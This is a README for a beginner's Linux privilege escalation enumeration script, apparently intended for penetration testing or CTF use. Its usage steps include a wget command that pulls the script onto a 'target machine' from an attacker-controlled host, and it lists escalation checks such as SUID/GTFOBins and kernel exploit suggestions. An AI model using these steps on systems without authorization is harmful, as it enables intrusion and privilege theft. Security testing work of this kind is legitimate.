# Privilege Escalation Helper Tool

This is a beginner-friendly privilege escalation enumeration tool designed for Linux systems. It automatically checks for:
- SUID binaries and matches them against GTFOBins
- Writable paths in $PATH
- Cron jobs
- Kernel version and suggests known exploits using linux-exploit-suggester

## Usage

1. Upload the script to the target machine:
```
wget http://<attacker-ip>/privesc_helper.sh
chmod +x privesc_helper.sh
```
2. (Optional) Place `linux-exploit-suggester.sh` in the same folder.

3. Run the tool:
```
./privesc_helper.sh
```

4. Check the results in `privesc_report.txt`.

<p align="center">
  <img src="demo.jpg" alt="Auto-privsec Demo Screenshot" width="900px">
</p>


## Notes

- The script requires `curl`, `bash`, and `tee`.
- It does not exploit automatically — it assists with clear enumeration.

## License

MIT License

Copyright (c) 2025 ZAR

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the “Software”), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

